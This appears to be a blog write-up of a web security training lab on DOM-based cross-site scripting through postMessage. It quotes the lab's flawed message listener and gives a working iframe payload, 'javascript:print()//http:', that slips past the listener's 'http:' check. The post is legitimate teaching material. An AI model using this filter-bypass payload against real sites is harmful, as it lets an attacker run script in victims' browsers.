---
layout: post
title:  "DOM XSS using web messages and a JavaScript URL"
date:   2024-11-19 10:20:54 +0530
categories: [BSCP, DOM Based]
---

## Objective 

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Solution 

Just like the last lab on "DOM XSS using web message" we can look into the source of the page and we found the following javascript code 

```js
<script>
    window.addEventListener('message', function (e) {
        var url = e.data;

        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

What the code does his, firstly listens for messages sent to the window using the postMessage API and then extracts the message... further more it checks whether any keywords or protocols like `http:` or `https:` matches then it passes through the `location.href` where it will get redirected 

Let's take the same payload like the last lab but instead off the `<img>` payload we can utilise like `javascript:print()//http:` where `http:` is valid and passes the check.. which will set the location header `javascript:print()` like `Location: javascript:print()` executes the `print()` function 

```js
<iframe src="https://0a40008104dba225824dca7000aa0069.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

Now, deliver the exploit to client using the exploit server and that solves the lab 

![]({{ site.baseurl }}/assets/images/dom/dom-1.png)